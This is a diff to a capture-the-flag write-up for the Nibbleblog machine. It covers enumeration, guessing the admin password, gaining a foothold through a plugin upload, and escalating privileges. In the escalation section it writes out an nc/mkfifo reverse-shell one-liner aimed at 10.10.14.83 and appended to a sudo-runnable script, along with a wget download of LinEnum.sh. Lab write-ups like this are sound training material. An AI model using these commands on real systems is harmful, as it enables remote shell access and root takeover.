@@ -6,6 +6,7 @@
 * [Enumeration](#enumeration)
 * [Footprinting](#footprinting)
 * [Initial Foothold](#initialfoothold)
+* [Privilege Escalation](#privilegeescalation)
 
 ### Overview
 
@@ -66,7 +67,7 @@ We don't find anything interesting in the /nibbleblog directory in Firefox. <br>
 Let's try to use `Gobuster` to check for other accessible pages or directories. <br>
 
 ![gobuster](images/gobuster_nibbleblog.png)
-
+n
 We see that the admin.php page is present, there is also a `README` page available. <br>
 By curling the `README` page, we identify: <br>
 
@@ -77,12 +78,29 @@ the version of `Nibbleblog: v4.0.3` <br>
 After revisiting the `Gobuster` output, I noticed that there are Status 301 codes in `/content` & `/plugins` <br>
 We visit the `/content` page to see if there's anything useful. <br>
 
---
+![content](images/nibbleblog_content.png)
+
+There are 3 folders, after further exploring: <br>
+
+![content](images/nibbleblog_content_private.png)
+![content](images/nibbleblog_content_private_usersxml.png)
+![content](images/nibbleblog_content_private_configxml.png)
+
+We confirm that there is a username `admin`. There is also a blacklist of repeated attempts more than 5. By pure guessing, we discover the password is the name of the box. <br>
+We are in!
+
+![content](images/nibbleblog_admin.png)
 
 
 ### InitialFoothold
 
---
+We explore further, to see what we can do with all of these directories. <br>
+
+![content](images/nibbleblog_admin_plugin.png)
+![content](images/nibbleblog_admin_plugin_rcetest.png)
+![content](images/nibbleblog_admin_plugin_rcesuccess.png)
+
+
 
 
 
@@ -91,11 +109,49 @@ We will use the following `Bash` reverse shell and upload it. <br>
 
 
 Now, we `curl` the image page again to execute it. <br>
+We can also just navigate to this directory that has stored the image to run the remote code. <br>
+
+![content](images/nibbleblog_content_private_plugins.png)
+![content](images/nibbleblog_content_private_plugins_image.png)
+
+
+
 We have a reverse shell! <br>
 We use `python3 -c 'import pty; pty.spawn("/bin/bash")'` to get us a more intuitive shell <br>
 
+![content](images/nc_success.png)
+
+We discover the `user` flag after navigating to the home directory. <br>
+
+![content](images/user_flag.png)
 
 
---
 
-By using `LinEnum.sh` from [GitHub]([https://github.com](https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh) "LinEnum.sh")
+### PrivilegeEscalation
+
+We also see a `personal.zip`, lets unzip it and have a look at its contents. We find a file that tells us how to run an application. <br>
+There's nothing interesting to note here. I moved on to try something else. <br>
+
+![privilegeesc](images/unzip_personal.png)
+
+Next, by using `LinEnum.sh` from [GitHub]([https://github.com](https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh) "LinEnum.sh") <br>
+we host a `Python` HTTP server on our host by using `sudo python3 -m http.server 8080` to download the script to our target. <br>
+Then, from the target, we execute `wget http://10.10.14.83:8080/LinEnum.sh` to retrieve it from the hosted server. We should see a 200 success response on our `Python` HTTP server. <br>
+Next, we make the script executable and run it.
+
+![privilegeesc](images/lin_enum_exec.png)
+
+I noticed some interesting output! <br>
+
+![privilegeesc](images/lin_enum.png)
+
+
+We have sudo privileges on `/home/nibbler/personal/stuff/monitor.sh`. If we append a reverse shell to the end of it, we can potentially get a reverse shell back as the root user. <br>
+Let's append a reverse shell to it by `echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.83 8443 >/tmp/f' | tee -a monitor.sh` <br>
+Now we can run the script with `sudo` <br>
+
+![privilegeesc](images/append_reverse_shell.png)
+
+Our listener on another terminal gets a connection, and we get root!!! We move to the home directory and see a `flag`. We have successfully gained root!
+
+![privilegeesc](images/root_flag.png)
